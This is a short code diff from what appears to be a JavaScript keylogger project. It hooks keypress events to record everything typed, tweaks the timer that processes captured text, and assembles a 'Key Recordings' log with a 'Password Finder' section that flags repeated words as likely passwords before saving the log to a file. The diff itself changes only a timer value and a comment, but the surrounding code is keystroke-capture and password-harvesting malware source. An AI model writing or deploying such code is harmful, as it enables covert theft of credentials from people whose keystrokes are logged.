@@ -58,7 +58,7 @@ onkeypress = function(e) { // calling the function to execute whenever a keystro
     objToString(counts);
     hasDuplicates(counts, a, b);
     // console.log(allTextSplit);
-}, 3000); // set interval to execute function continuously 
+}, 5000); // set interval to execute function continuously 
 
 
 function splitAllText(allText) {        //  Splits the text by spaces to make words
@@ -169,7 +169,8 @@ function saveTextAsFile() {
     var possiblePasswordsText = "Password Finder: " + "\n" + "(Potential passwords that continually show up are most likely to be actual passwords)"
                                 + "\n" + possiblePasswordsString;
     var dateString = new Date().toLocaleString();
-    var fullLog = "Key Recordings saved on " + dateString + "\n" + "\n" + "\n" +  numOfWordsString + "\n" + "\n" + "\n" +  strObj + "\n" + "\n" + possiblePasswordsText;     //  This is the final string with all the log data recorded
+    //  This is the final string with all the log data recorded
+    var fullLog = "Key Recordings saved on " + dateString + "\n" + "\n" + "\n" +  numOfWordsString + "\n" + "\n" + "\n" +  strObj + "\n" + "\n" + possiblePasswordsText;   
     // allTextJoined = allTextSplit.join([separator = ' ']);
     // var textToWrite = allTextJoined;
     var textFileAsBlob = new Blob([fullLog], {type:'text/plain'});
